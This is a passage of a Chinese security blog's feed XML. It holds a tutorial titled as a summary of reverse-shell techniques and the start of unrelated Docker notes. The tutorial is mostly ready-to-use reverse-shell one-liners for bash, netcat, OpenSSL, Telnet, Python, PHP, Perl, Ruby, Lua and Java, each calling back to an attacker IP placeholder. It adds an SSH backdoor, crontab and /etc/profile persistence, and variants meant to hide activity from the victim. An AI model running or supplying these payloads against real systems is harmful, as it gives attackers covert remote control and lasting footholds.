href="#反向连接shell" class="headerlink" title="反向连接shell"></a>反向连接shell</h2><p>原理：</p><p>攻击机打开自己的6000端口，受害主机主动把自己的shell发送给6000端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lvpp 6000</span><br><span class="line">B:nc [A's IP] 6000 -e /bin/sh</span><br></pre></td></tr></table></figure><h1 id="反弹shell多种姿势"><a href="#反弹shell多种姿势" class="headerlink" title="反弹shell多种姿势"></a>反弹shell多种姿势</h1><h2 id="利用Bash"><a href="#利用Bash" class="headerlink" title="利用Bash"></a>利用Bash</h2><p>先写姿势：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">bash -c "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span><br></pre></td></tr></table></figure><p>之前简单介绍了借助nc来实现，其实bash自己就可以做到发送shell</p><p>Attacker: <code>nc -lvvp 2333</code></p><p>Victim: <code>bash -i &gt;&amp; dev/tcp/[attacker&#39;s ip]/2333 0&gt;&amp;1</code></p><p>一步步看：</p><p><strong>bash -i</strong></p><p>开启交互模式</p><p><strong>/dev/tcp/ip/port</strong></p><p>这是一个十分特殊的文件，直接访问它是不存在的</p><p>但是如果现在有主机A在ip+port监听，那么你对它读写。就可以实现与A的socket通信</p><p>比如:</p><p>攻击机：echo “hello” &gt; /dev/tcp/[attacker’s ip]/6000</p><p>就可以将hello通过socket通信，发送到受害者主机 </p><p>再比如：</p><p>攻击机在<code>nc -lvvp 6000</code>开启本地端口之后，随便在键盘写点东西</p><p>这时候如果受害机<code>cat &lt; /dev/tcp/[attacker&#39;s ip]/6000</code></p><p>就可以看到刚才输入的数字</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609100554103.png" alt="image-20210609100554103"></p><p><strong>bash -i &gt; /dev/tcp/ip/port</strong></p><p>这条命令就是将受害机的输出重定向到ip+port上</p><p>这时候在受害机输入任何命令，结果都会显示在攻击者主机上</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102002692.png" alt="image-20210609102002692"></p><p><strong>bash -i &lt; /dev/tcp/ip/port</strong></p><p>上一个命令仅仅是接受受害机的输入，将命令结果定向到攻击机。还差点意思</p><p>这条命令就是将受害机输入也重定向到Socket的输入</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102236985.png" alt="image-20210609102236985"></p><p><strong>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</strong></p><p>现在合二为一，这条命令解释一下就是：</p><p>顺序肯定是从左向右，首先将输出1重定向到socket，然后把输入0定向到1，也就是socket</p><p>这样一来，输入和输出都定向到了socket，也就是/dev/tcp/ip/port</p><p>这样就形成了一个回路，完成了远程shell的交互。</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609104651585.png" alt="image-20210609104651585"></p><p>但是这样在受害机还是能看到有操作痕迹，我们希望”悄无声息”的进行shell交互</p><p>这就需要用到模糊输出，以下两种格式都可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line">bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>末尾的<code>0&gt;&amp;1和0&lt;&amp;1</code>除了打开方式不同 在这里没区别 看个人习惯</p><p> 第二个命令里面 <code>&gt;&amp; &amp;&gt;</code>都可以</p><h3 id="借助exec"><a href="#借助exec" class="headerlink" title="借助exec"></a>借助exec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><p>原理：</p><p>新建了一个文件描述符，标号5，让5结合exec重定向到socket</p><p>接下来，将输入设置为5指向的socket</p><p>后半段：<code>while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></p><p>拆开就是:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do $line &gt;&amp;5 2&gt;&amp;1</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>首先从socket中读取一行，复制给line变量</p><p>接下来执行line变量（这一行的内容），然后将结果输出到socket，done结束</p><p>类似的还可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p>应用：</p><ol><li><p>配合curl 将一句话写入受害主机的index.php 然后<code>curl ip | bash</code></p></li><li><p>写入crontab定时任务，但是必须知道用户名</p><p>一般来说，一般都是root</p><p>centos：<code>/var/spool/cron/root</code></p><p>debian：<code>/var/spool/cron/crontabs/root</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">每隔一分钟，发送shell</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一句话版本</span></span><br><span class="line">crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -</span><br></pre></td></tr></table></figure></li><li><p>写入<code>/etc/profile</code>配置文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></li></ol><h2 id="利用NetCat"><a href="#利用NetCat" class="headerlink" title="利用NetCat"></a>利用NetCat</h2><p>刚刚提到了，再写一遍：</p><p>受害者主机回连：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh ip 4000</span><br></pre></td></tr></table></figure><p>如果-e 参数用不了怎么办？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip 4000 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>mkfifo首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。</p><p>还可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc ip 4000 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure><h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><h3 id="利用OpenSSL"><a href="#利用OpenSSL" class="headerlink" title="利用OpenSSL"></a>利用OpenSSL</h3><p>先生成自签名证书，一路回车：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><p>首先在攻击机上开放4000端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4000</span><br></pre></td></tr></table></figure><p>此时 OpenSSL 便在攻击机的4000端口上启动了一个 SSL/TLS server。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect ip:port &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure><h3 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h3><p>方法1：单端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line">mknod a p; telnet attacker_ip 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p>方法2：双端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4000</span><br><span class="line">nc -lvvp 5000</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4000 输入 5000输出</span></span><br><span class="line">telnet ip 4000 | /bin/bash | telnet ip 5000</span><br></pre></td></tr></table></figure><h3 id="利用SSH"><a href="#利用SSH" class="headerlink" title="利用SSH"></a>利用SSH</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">受害主机执行:</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=5000;   </span><br><span class="line"></span><br><span class="line">攻击机器:</span><br><span class="line">ssh root@victim_ip -p 5000 [用户名root,密码随意]</span><br></pre></td></tr></table></figure><h2 id="利用各种语言脚本"><a href="#利用各种语言脚本" class="headerlink" title="利用各种语言脚本"></a>利用各种语言脚本</h2><p>攻击机ip，监听port</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></pre></td></tr></table></figure><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e 'c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></pre></td></tr></table></figure><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">1</a></p><p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">2</a></p><p><a href="https://xz.aliyun.com/t/9488#toc-9" target="_blank" rel="noopener">3</a></p><p><a href="https://jkme.github.io/pages/reverse-shell.html" target="_blank" rel="noopener">4</a></p><p><a href="https://www.jianshu.com/p/cb26a0f6c622" target="_blank" rel="noopener">netcat用法</a></p><p><a href="https://huangwang.github.io/2019/09/22/netcat%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/" target="_blank" rel="noopener">netcat使用方法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;曲径通幽处，禅房花木深。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 抽空总结一下nc经典用法以及反弹shell的多种姿势。   &lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://fynch3r.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="shell" scheme="https://fynch3r.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://fynch3r.github.io/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://fynch3r.github.io/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-19T03:17:25.000Z</published>
    <updated>2021-12-28T07:23:22.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>欲穷千里目，更上一层楼。</p></blockquote><p>在调试漏洞的过程中会密切地和Docker打交道，总结一下Docker的操作。</p><a id="more"></a><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>Docker包括三个基本概念：</p><ul><li>镜像<code>Image</code></li><li>容器<code>Container</code></li><li>仓库<code>Repository</code></li></ul><p>镜像就像类，容器就像实例。  </p><p>容器的实质是进程，容器进程属于自己独立的命名空间，也就是进程隔离</p><p>仓库是镜像的存储分发，默认仓库内的镜像是<code>&lt;仓库名&gt;:&lt;Tag&gt;</code>，默认tag是latest</p><p>对于一个<a href="https://hub.docker.com/_/ubuntu" target="_blank" rel="noopener">ubuntu</a>仓库来说：     </p><p>ubuntu是仓库的名字，<code>ubuntu：16.04</code>和<code>ubuntu:18.04</code>则是两个不同标签代表不同版本。</p><p>仓库通常是<strong>两段式命名</strong>，例如<code>ownername/nginx</code></p><p>前者是用户名，后者是镜像。</p><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [args] [域名[：端口号] /] 仓库名[:标签]</span><br></pre></td></tr></table></figure><p><code>docker pull --help</code>看细节</p><ul><li>docker仓库地址：<code>&lt;域名/IP&gt;[:端口号]</code> 默认地址是docker.io</li><li>仓库名：<code>&lt;仓库名/软件名&gt;</code> 仓库名不写，默认是library，也就是官方镜像</li></ul><p>比如：<code>docker pull ubuntu:18.04</code></p><p>完整仓库名就是：<code>docker.io/library/ubuntu:18.04</code></p><h2 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -i -t --rm ubuntu:18.04 /bin/bash</span></span><br></pre></td></tr></table></figure><p>解读：</p><ul><li><code>-i</code>参数是启动容器内交互式操作模式</li><li><code>-t</code>参数是在容器内开启一个终端</li><li><code>--rm</code>代表容器退出后随之将该容器删除，不必再手动rm，不支持以 docker run -d 启动的容器</li><li><code>bash</code>就是给容器的命令，这里我们希望得到交互式shell，所以打开bash</li></ul><p>其他参数：</p><ul><li><code>-d</code>可以让容器在后台运行</li><li><code>-p</code> 暴露端口</li><li><code>exit</code>退出容器</li></ul><h2 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br><span class="line">docker images -a</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519121316891.png" alt="image-20210519121316891"></p><p>参数：</p><ul><li><code>docker image ls -q</code>只显示image的id</li><li><code>docker image ls ubuntu</code>只显示仓库名是ubuntu的image</li></ul><h2 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image rm [args] &lt;image<span class="string">'s id/reponame/&gt;</span></span><br><span class="line"><span class="string">docker rmi -f 镜像id</span></span><br><span class="line"><span class="string">docker rmi -f $(docker images -aq) #删除全部镜像</span></span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>这里面的<code>image&#39;s id</code>通常可以是长ID12位，也可以仅仅是前3位短id</li></ul><p>配合docker image ls</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image rm $(docker image ls -q redis) <span class="comment">#删除所有仓库名为 redis 的镜像</span></span><br></pre></td></tr></table></figure><h2 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h2><p>在docker hub中搜索镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure><h2 id="提交镜像"><a href="#提交镜像" class="headerlink" title="提交镜像"></a>提交镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m "xxx" -a="author" 镜像id 目标镜像名：TAG</span><br></pre></td></tr></table></figure><p>保存在本地</p><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="新建-amp-启动"><a href="#新建-amp-启动" class="headerlink" title="新建&amp;启动"></a>新建&amp;启动</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu:18.04 /bin/<span class="built_in">echo</span> <span class="string">"helloworld"</span></span></span><br></pre></td></tr></table></figure><p>没有的镜像，会自动pull </p><h2 id="守护态运行"><a href="#守护态运行" class="headerlink" title="守护态运行"></a>守护态运行</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122754667.png" alt="image-20210519122754667"></p><p>会将结果打印在本地终端，这里需要启动<code>-d</code>参数，来让容器在后台运行：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122959476.png" alt="image-20210519122959476"></p><p>就不再会打印到本地终端。</p><p>使用<code>docker logs 86d4eab113a908ce2ee49fa46145623d62a290a76ab3807429588f7c2868bd6</code>来查看</p><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519123132506.png" alt="image-20210519123132506"></p><p>输出内容会在日子里体现出来，</p><h2 id="查看运行中的容器"><a href="#查看运行中的容器" class="headerlink" title="查看运行中的容器"></a>查看运行中的容器</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br><span class="line">docker ps <span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps -a <span class="comment"># 查看历史运行过的容器</span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519130640053.png" alt="image-20210519130640053"></p><p>对比可以发现，刚才那一长串才是完整ID</p><p>查看容器的日志信息：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container logs [id or name]</span><br></pre></td></tr></table></figure><h2 id="终止-amp-重启容器"><a href="#终止-amp-重启容器" class="headerlink" title="终止&amp;重启容器"></a>终止&amp;重启容器</h2><p>首先，当容器内的程序结束时，容器也将自动终止。</p><p>对于一般情况，可以使用<code>docker container stop [id or name]</code>来终止</p><p>终止状态的docker信息可以<code>docker container ls -a</code>来查看</p><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519131228416.png" alt="image-20210519131228416"></p><p>在容器内部</p><p><code>exit</code>退出并终止容器</p><p><code>ctrl+p+q</code> 退出但不终止容器</p><p>对于已经停掉的容器，重新启动可以<code>docker container start [id or name]</code></p><p>对于正在运行的容器，强制重新启动可以<code>docker container restart [id or name]</code></p><p>删除全部容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f $(docker ps -aq)</span><br><span class="line">docker ps -aq | xargs docker rm</span><br></pre></td></tr></table></figure><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><p>attach和exec都可以，更推荐exec</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br><span class="line"></span><br><span class="line">docker exec -it [shortid] /bin/bash <span class="comment"># 进入容器后开启新的终端</span></span><br><span class="line">docker attach [shortid] <span class="comment"># 进入容器当前正在执行的终端</span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132015322.png" alt="image-20210519132015322"></p><p>原因：</p><ul><li><code>-it</code>一起使用时，可以进入交互模式，并且可以看到熟悉的<code>linux</code>命令提示符</li></ul><h2 id="容器的导出-amp-导入"><a href="#容器的导出-amp-导入" class="headerlink" title="容器的导出&amp;导入"></a>容器的导出&amp;导入</h2><p><strong>导出</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export id &gt; ubuntu.tar</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132819881.png" alt="image-20210519132819881"></p><p><strong>导入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat ubuntu.tar | docker import - <span class="built_in">test</span>/ubuntu:v1.0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE</span><br><span class="line">test/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</span><br></pre></td></tr></table></figure><p>也可以通过网址来import：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">import</span> http:<span class="comment">//example.com/exampleimage.tgz example/imagerepo</span></span><br></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><p><strong>删除正在运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container rm -f [id or name]</span><br></pre></td></tr></table></figure><p><strong>删除所有容器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure><h2 id="外部网络访问容器"><a href="#外部网络访问容器" class="headerlink" title="外部网络访问容器"></a>外部网络访问容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P nginx</span><br></pre></td></tr></table></figure><p><code>-P</code>参数的意思就是随机打开一个本地端口</p><p>查看访问日志；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs id</span><br></pre></td></tr></table></figure><p><code>-p</code> 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 <code>ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 55500:80</span><br></pre></td></tr></table></figure><p>意思就是本机的55500端口映射给80端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 80:80</span><br></pre></td></tr></table></figure><p>的意思就是<strong>映射全部端口</strong>。</p><p>比较：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p 80:80 绑定对应所有端口</span><br><span class="line">-p 127.0.0.1:80:80 指定映射使用一个特定地址</span><br><span class="line">-p 127.0.0.1::80 绑定本地的任意端口给容器的80端口</span><br></pre></td></tr></table></figure><p><strong>查看端口映射的配置</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port id 80</span><br></pre></td></tr></table></figure><p>查看当前所有的网络配置</p><p>·</p><h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器id</span><br></pre></td></tr></table></figure><h1 id="容器的加载"><a href="#容器的加载" class="headerlink" title="容器的加载"></a>容器的加载</h1><p>tar文件：容器的离线保存</p><h2 id="container-gt-image"><a 